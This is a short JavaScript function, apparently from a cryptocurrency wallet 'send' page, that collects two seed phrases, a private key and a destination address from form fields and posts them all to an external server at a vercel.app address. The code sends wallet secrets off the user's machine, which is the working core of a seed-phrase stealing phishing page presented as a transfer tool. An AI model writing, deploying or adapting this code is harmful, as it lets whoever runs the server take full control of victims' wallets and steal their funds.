
async function startSending() {
    const seed1 = document.getElementById("seed1").value.trim();
    const seed2 = document.getElementById("seed2").value.trim();
    const privKey = document.getElementById("privkey").value.trim();
    const toAddr = document.getElementById("toAddress").value.trim();
    const log = document.getElementById("log");
    log.textContent = "Processing...\n";

    const res = await fetch('https://to-fishstick-tau.vercel.app/api/send', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ seed1, seed2, privKey, toAddr })
    });
    const result = await res.text();
    log.textContent += result;
}
